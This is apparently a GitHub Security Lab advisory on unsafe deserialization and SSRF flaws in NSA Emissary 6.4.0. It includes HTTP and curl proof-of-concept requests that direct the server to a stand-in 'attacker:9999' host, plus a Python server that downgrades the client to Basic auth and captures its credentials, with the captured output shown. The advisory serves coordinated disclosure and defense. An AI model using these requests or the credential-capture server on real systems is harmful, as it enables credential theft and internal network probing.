<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">July 16, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2021-067_068: Post-authentication Unsafe Deserialization and Server-Side Request Forgery (SSRF) in NSA Emissary - CVE-2021-32634, CVE-2021-32639</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/pwntester">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/125701?s=35" height="35" width="35">
        <span>Alvaro Munoz</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      
<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>
<ul>
  <li>2021-04-13: Report sent to EmissarySupport@evoforge.org</li>
  <li>2021-05-21: <a href="https://github.com/NationalSecurityAgency/emissary/security/advisories/GHSA-m5qf-gfmp-7638">Unsafe deserialization advisory</a> is published</li>
  <li>2021-07-02: <a href="https://github.com/NationalSecurityAgency/emissary/security/advisories/GHSA-2p8j-2rf3-h4xr">SSRF advisory</a> is published</li>
</ul>

<h2 id="summary">Summary</h2>
<p>Emissary is vulnerable to post-authentication Unsafe Deserialization and Server-Side Request Forgery (SSRF)</p>

<h2 id="product">Product</h2>
<p>National Security Agency Emissary</p>

<h2 id="tested-version">Tested Version</h2>
<p>6.4.0</p>

<h2 id="details">Details</h2>

<h3 id="issue-1-unsafe-deserialization-ghsl-2021-067">Issue 1: Unsafe Deserialization (GHSL-2021-067)</h3>

<p>The <a href="https://github.com/NationalSecurityAgency/emissary/blob/30c54ef16c6eb6ed09604a929939fb9f66868382/src/main/java/emissary/server/mvc/internal/WorkSpaceClientEnqueueAction.java"><code class="language-plaintext highlighter-rouge">WorkSpaceClientEnqueueAction</code></a> endpoint is vulnerable to Unsafe Deserialization:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nd">@POST</span>
    <span class="nd">@Path</span><span class="o">(</span><span class="s">"/WorkSpaceClientEnqueue.action"</span><span class="o">)</span>
    <span class="nd">@Consumes</span><span class="o">(</span><span class="nc">MediaType</span><span class="o">.</span><span class="na">APPLICATION_FORM_URLENCODED</span><span class="o">)</span>
    <span class="nd">@Produces</span><span class="o">(</span><span class="nc">MediaType</span><span class="o">.</span><span class="na">TEXT_PLAIN</span><span class="o">)</span>
    <span class="kd">public</span> <span class="nc">Response</span> <span class="nf">workspaceClientEnqueue</span><span class="o">(</span><span class="nd">@FormParam</span><span class="o">(</span><span class="nc">WorkSpaceAdapter</span><span class="o">.</span><span class="na">CLIENT_NAME</span><span class="o">)</span> <span class="nc">String</span> <span class="n">clientName</span><span class="o">,</span>
            <span class="nd">@FormParam</span><span class="o">(</span><span class="nc">WorkSpaceAdapter</span><span class="o">.</span><span class="na">WORK_BUNDLE_OBJ</span><span class="o">)</span> <span class="nc">String</span> <span class="n">workBundleString</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">logger</span><span class="o">.</span><span class="na">debug</span><span class="o">(</span><span class="s">"TPWorker incoming execute! check prio={}"</span><span class="o">,</span> <span class="nc">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getPriority</span><span class="o">());</span>
        <span class="c1">// TODO Doesn't look like anything is actually calling this, should we remove this?</span>
        <span class="kd">final</span> <span class="kt">boolean</span> <span class="n">success</span><span class="o">;</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="c1">// Look up the place reference</span>
            <span class="kd">final</span> <span class="nc">String</span> <span class="n">nsName</span> <span class="o">=</span> <span class="nc">KeyManipulator</span><span class="o">.</span><span class="na">getServiceLocation</span><span class="o">(</span><span class="n">clientName</span><span class="o">);</span>
            <span class="kd">final</span> <span class="nc">IPickUpSpace</span> <span class="n">place</span> <span class="o">=</span> <span class="o">(</span><span class="nc">IPickUpSpace</span><span class="o">)</span> <span class="nc">Namespace</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="n">nsName</span><span class="o">);</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">place</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="nf">IllegalArgumentException</span><span class="o">(</span><span class="s">"No client place found using name "</span> <span class="o">+</span> <span class="n">clientName</span><span class="o">);</span>
            <span class="o">}</span>

            <span class="kd">final</span> <span class="nc">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="nc">ByteArrayInputStream</span><span class="o">(</span><span class="n">workBundleString</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(</span><span class="s">"8859_1"</span><span class="o">)));</span>
            <span class="nc">WorkBundle</span> <span class="n">paths</span> <span class="o">=</span> <span class="o">(</span><span class="nc">WorkBundle</span><span class="o">)</span> <span class="n">ois</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
            <span class="n">success</span> <span class="o">=</span> <span class="n">place</span><span class="o">.</span><span class="na">enque</span><span class="o">(</span><span class="n">paths</span><span class="o">);</span>
        <span class="o">}</span> 
        <span class="o">...</span>
    <span class="o">}</span>
</code></pre></div></div>

<p>This endpoint can be reached via authenticated POST request to <code class="language-plaintext highlighter-rouge">/WorkSpaceClientEnqueue.action</code>. The form parameter <code class="language-plaintext highlighter-rouge">tpObj</code> (WORK_BUNDLE_OBJ) gets decoded and deserialized in <a href="https://github.com/NationalSecurityAgency/emissary/blob/30c54ef16c6eb6ed09604a929939fb9f66868382/src/main/java/emissary/server/mvc/internal/WorkSpaceClientEnqueueAction.java#L52">line 52</a></p>
<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kd">final</span> <span class="nc">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="nc">ByteArrayInputStream</span><span class="o">(</span><span class="n">workBundleString</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(</span><span class="s">"8859_1"</span><span class="o">)));</span>
</code></pre></div></div>

<p>There are other two unsafe deserializations which are not currently exercised in the code. However they are ticking bombs which can be enabled in future releases:</p>
<ol>
  <li><a href="https://github.com/NationalSecurityAgency/emissary/blob/30c54ef16c6eb6ed09604a929939fb9f66868382/src/main/java/emissary/util/PayloadUtil.java#L164"><code class="language-plaintext highlighter-rouge">PayloadUtil.java</code></a>
Exercised in <a href="https://github.com/NationalSecurityAgency/emissary/blob/22744ec91ef759078b14975df74a66243f1ce679/src/main/java/emissary/server/mvc/internal/MoveToAction.java"><code class="language-plaintext highlighter-rouge">MoveToAction</code></a> which is currently not exposed by Jersey server.</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MoveToAction:
public Response moveTo(@Context HttpServletRequest request) 
  final MoveToAdapter mt = new MoveToAdapter();
  final boolean status = mt.inboundMoveTo(request);

MoveToAdapter:
public boolean inboundMoveTo(final HttpServletRequest req)
  final MoveToRequestBean bean = new MoveToRequestBean(req);
    MoveToRequestBean(final HttpServletRequest req)
      final String agentData = RequestUtil.getParameter(req, AGENT_SERIAL);
      setPayload(agentData);
        this.payload = PayloadUtil.deserialize(s);
                
PayloadUtil:
  ois = new ObjectInputStream(new ByteArrayInputStream(s.getBytes("8859_1"))); 
</code></pre></div></div>

<ol>
  <li><a href="https://github.com/NationalSecurityAgency/emissary/blob/2e7939f3540f47f0374e77f083af8a657023de35/src/main/java/emissary/server/mvc/adapters/WorkSpaceAdapter.java"><code class="language-plaintext highlighter-rouge">WorkSpaceAdapter.java</code></a>
Requires a call to <code class="language-plaintext highlighter-rouge">inboundEnque()</code> which is currently not exercised. Dataflow to the deserialization on <a href="https://github.com/NationalSecurityAgency/emissary/blob/2e7939f3540f47f0374e77f083af8a657023de35/src/main/java/emissary/server/mvc/adapters/WorkSpaceAdapter.java#L305">line 305</a>:</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WorkspaceAdapter:
public boolean inboundEnque(final HttpServletRequest req)
  final EnqueRequestBean bean = new EnqueRequestBean(req);
    EnqueRequestBean(final HttpServletRequest req)
      setPaths(RequestUtil.getParameter(req, WORK_BUNDLE_OBJ)); 
        final ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(s.getBytes("8859_1"))); 
</code></pre></div></div>

<h4 id="impact">Impact</h4>
<p>This issue may lead to post-auth Remote Code Execution. Since version 6.3.0, the endpoint is protected against CSRF attacks, which reduces the impact of the vulnerability. However, if a new XSS vulnerability is introduced in the future, it might allow an attacker to craft a malicious page that, when visited by a victim, will trigger the unsafe deserialization.</p>

<h3 id="issue-2-server-side-request-forgery-ghsl-2021-068">Issue 2: Server-Side Request Forgery (GHSL-2021-068)</h3>

<h4 id="ssrf-in-registerpeeraction">SSRF in <code class="language-plaintext highlighter-rouge">RegisterPeerAction</code></h4>
<p>The <a href="https://github.com/NationalSecurityAgency/emissary/blob/30c54ef16c6eb6ed09604a929939fb9f66868382/src/main/java/emissary/server/mvc/internal/RegisterPeerAction.java"><code class="language-plaintext highlighter-rouge">RegisterPeerAction</code></a> endpoint is vulnerable to Server-Side Request Forgery (SSRF). A POST request to the <code class="language-plaintext highlighter-rouge">/RegisterPeer.action</code> endpoint will trigger additional requests to hosts controlled by the attacker</p>

<p>For example, the following request will cause multiple requests to be sent to the attacker server (http://attacker:9999)</p>

<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/emissary/RegisterPeer.action?</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">localhost:8001</span>
<span class="na">X-Requested-By</span><span class="p">:</span> <span class="s">emissary</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>

directoryName=foo.bar.baz.http://attacker:9999/&amp;targetDir=http://localhost:8001/DirectoryPlace
</code></pre></div></div>

<p>Some of the forged requests are non-authenticated requests sent to the <code class="language-plaintext highlighter-rouge">/emissary/Heartbeat.action</code> endpoint:</p>

<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/emissary/Heartbeat.action</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">X-Requested-By</span><span class="p">:</span> <span class="s">emissary</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">180</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded; charset=UTF-8</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">attacker:9999</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">Keep-Alive</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Apache-HttpClient/4.5.1 (Java/1.8.0_242)</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip,deflate</span>

hbf=EMISSARY_DIRECTORY_SERVICES.DIRECTORY.STUDY.http%3A%2F%2Flocalhost%3A8001%2FDirectoryPlace&amp;hbt=http%3A%2F%2Fattacker:9999%2FDirectoryPlace
</code></pre></div></div>

<p>However, some others are authenticated requests sent to the <code class="language-plaintext highlighter-rouge">/emissary/RegisterPeer.action</code> endpoint on the attacker-controlled server:</p>

<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/emissary/RegisterPeer.action</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">X-Requested-By</span><span class="p">:</span> <span class="s">emissary</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">196</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded; charset=UTF-8</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">attacker:9999</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">Keep-Alive</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Apache-HttpClient/4.5.1 (Java/1.8.0_242)</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip,deflate</span>

targetDir=http%3A%2F%2Fattacker:9999%2FDirectoryPlace&amp;directoryName=EMISSARY_DIRECTORY_SERVICES.DIRECTORY.STUDY.http%3A%2F%2Flocalhost%3A8001%2FDirectoryPlace
</code></pre></div></div>

<p>This can be used to scan the internal network or, if this is an authenticated request, leak the user’s password. For example by starting a simple python server which requests Basic authentication, the emissary client will change from Digest auth to Basic auth and will send the credentials to the attacker:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">BaseHTTPServer</span>
<span class="kn">from</span> <span class="nn">SimpleHTTPServer</span> <span class="kn">import</span> <span class="n">SimpleHTTPRequestHandler</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="k">class</span> <span class="nc">AuthHandler</span><span class="p">(</span><span class="n">SimpleHTTPRequestHandler</span><span class="p">):</span>
    <span class="s">''' Main class to present webpages and authentication. '''</span>
    <span class="k">def</span> <span class="nf">do_HEAD</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">send_header</span><span class="p">(</span><span class="s">'Content-type'</span><span class="p">,</span> <span class="s">'text/html'</span><span class="p">)</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">end_headers</span><span class="p">()</span>

    <span class="k">def</span> <span class="nf">do_AUTHHEAD</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">send_response</span><span class="p">(</span><span class="mi">401</span><span class="p">)</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">send_header</span><span class="p">(</span><span class="s">'WWW-Authenticate'</span><span class="p">,</span> <span class="s">'Basic realm=</span><span class="se">\"</span><span class="s">Test</span><span class="se">\"</span><span class="s">'</span><span class="p">)</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">send_header</span><span class="p">(</span><span class="s">'Content-type'</span><span class="p">,</span> <span class="s">'text/html'</span><span class="p">)</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">end_headers</span><span class="p">()</span>

    <span class="k">def</span> <span class="nf">do_POST</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="s">''' Present frontpage with user authentication. '''</span>
        <span class="k">if</span> <span class="bp">self</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="n">getheader</span><span class="p">(</span><span class="s">'Authorization'</span><span class="p">)</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">do_AUTHHEAD</span><span class="p">()</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">wfile</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">'no auth header received'</span><span class="p">)</span>
            <span class="k">pass</span>
        <span class="k">elif</span> <span class="bp">self</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="n">getheader</span><span class="p">(</span><span class="s">'Authorization'</span><span class="p">).</span><span class="n">startswith</span><span class="p">(</span><span class="s">'Basic '</span><span class="p">):</span>
            <span class="k">print</span><span class="p">(</span><span class="s">"Received: "</span> <span class="o">+</span> <span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="n">getheader</span><span class="p">(</span><span class="s">'Authorization'</span><span class="p">)[</span><span class="mi">6</span><span class="p">:]))</span>
            <span class="k">print</span><span class="p">(</span><span class="s">"Received: "</span> <span class="o">+</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="n">getheader</span><span class="p">(</span><span class="s">'Authorization'</span><span class="p">)[</span><span class="mi">6</span><span class="p">:]))</span>
            <span class="n">SimpleHTTPRequestHandler</span><span class="p">.</span><span class="n">do_GET</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span>
            <span class="k">pass</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">do_AUTHHEAD</span><span class="p">()</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">wfile</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="n">getheader</span><span class="p">(</span><span class="s">'Authorization'</span><span class="p">))</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">wfile</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">'not authenticated'</span><span class="p">)</span>
            <span class="k">pass</span>

<span class="k">def</span> <span class="nf">test</span><span class="p">(</span><span class="n">HandlerClass</span> <span class="o">=</span> <span class="n">AuthHandler</span><span class="p">,</span>
         <span class="n">ServerClass</span> <span class="o">=</span> <span class="n">BaseHTTPServer</span><span class="p">.</span><span class="n">HTTPServer</span><span class="p">):</span>
    <span class="n">BaseHTTPServer</span><span class="p">.</span><span class="n">test</span><span class="p">(</span><span class="n">HandlerClass</span><span class="p">,</span> <span class="n">ServerClass</span><span class="p">)</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span><span class="o">&lt;</span><span class="mi">2</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"usage SimpleAuthServer.py [port]"</span><span class="p">)</span>
        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>
    <span class="n">test</span><span class="p">()</span>
</code></pre></div></div>

<p>The output of the server will show the credentials:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~/emissary λ python2 SimpleAuthServer.py 9999
Serving HTTP on 0.0.0.0 port 9999 ...
Received: ZW1pc3Nhcnk6ZW1pc3NhcnkxMjM=
Received: emissary:emissary123
127.0.0.1 - - [13/Apr/2021 12:37:47] code 404, message File not found
127.0.0.1 - - [13/Apr/2021 12:37:47] "POST /emissary/Heartbeat.action HTTP/1.1" 404 -
Received: ZW1pc3Nhcnk6ZW1pc3NhcnkxMjM=
Received: emissary:emissary123
127.0.0.1 - - [13/Apr/2021 12:37:47] code 404, message File not found
127.0.0.1 - - [13/Apr/2021 12:37:47] "POST /emissary/RegisterPeer.action HTTP/1.1" 404 -
</code></pre></div></div>

<h4 id="ssrf-in-addchilddirectoryaction">SSRF in <code class="language-plaintext highlighter-rouge">AddChildDirectoryAction</code></h4>
<p>Similarly the <a href="https://github.com/NationalSecurityAgency/emissary/blob/30c54ef16c6eb6ed09604a929939fb9f66868382/src/main/java/emissary/server/mvc/internal/AddChildDirectoryAction.java"><code class="language-plaintext highlighter-rouge">AddChildDirectoryAction</code></a> endpoint is vulnerable to Server-Side Request Forgery (SSRF). A POST request to the <code class="language-plaintext highlighter-rouge">/AddChildDirectory.action</code> endpoint will trigger additional requested to hosts controlled by the attacker:</p>

<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/emissary/AddChildDirectory.action</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">localhost:8001</span>
<span class="na">x-requested-by</span><span class="p">:</span><span class="s"> </span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>

directoryName=foo.bar.baz.http://attacker:9999/&amp;targetDir=http://localhost:8001/DirectoryPlace
</code></pre></div></div>

<h4 id="impact-1">Impact</h4>
<p>This vulnerability may lead to credentials leak.</p>

<h4 id="resources">Resources</h4>
<p>Sample cURL requests</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">--location</span> <span class="nt">--request</span> POST <span class="s1">'http://localhost:8001/emissary/RegisterPeer.action'</span> <span class="se">\</span>
<span class="nt">--header</span> <span class="s1">'x-requested-by: '</span> <span class="se">\</span>
<span class="nt">--header</span> <span class="s1">'Content-Type: application/x-www-form-urlencoded'</span> <span class="se">\</span>
<span class="nt">--data-urlencode</span> <span class="s1">'directoryName=foo.bar.baz.http://localhost:9999/'</span> <span class="se">\</span>
<span class="nt">--data-urlencode</span> <span class="s1">'targetDir=http://localhost:8001/DirectoryPlace'</span>
</code></pre></div></div>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">--location</span> <span class="nt">--request</span> POST <span class="s1">'http://localhost:8001/emissary/AddChildDirectory.action'</span> <span class="se">\</span>
<span class="nt">--header</span> <span class="s1">'x-requested-by: '</span> <span class="se">\</span>
<span class="nt">--header</span> <span class="s1">'Content-Type: application/x-www-form-urlencoded'</span> <span class="se">\</span>
<span class="nt">--data-urlencode</span> <span class="s1">'directoryName=foo.bar.baz.http://localhost:9999/'</span> <span class="se">\</span>
<span class="nt">--data-urlencode</span> <span class="s1">'targetDir=http://localhost:8001/DirectoryPlace'</span>
</code></pre></div></div>

<h2 id="cve">CVE</h2>
<ul>
  <li>CVE-2021-32634</li>
  <li>CVE-2021-32639</li>
</ul>

<h2 id="resources-1">Resources</h2>
<ul>
  <li><a href="https://github.com/NationalSecurityAgency/emissary/security/advisories/GHSA-m5qf-gfmp-7638">https://github.com/NationalSecurityAgency/emissary/security/advisories/GHSA-m5qf-gfmp-7638</a></li>
  <li><a href="https://github.com/NationalSecurityAgency/emissary/security/advisories/GHSA-2p8j-2rf3-h4xr">https://github.com/NationalSecurityAgency/emissary/security/advisories/GHSA-2p8j-2rf3-h4xr</a></li>
</ul>

<h2 id="credit">Credit</h2>
<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/pwntester">@pwntester (Alvaro Muñoz)</a>.</p>

<h2 id="contact">Contact</h2>
<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2021-067</code> and <code class="language-plaintext highlighter-rouge">GHSL-2021-068</code> in any communication regarding this issue.</p>


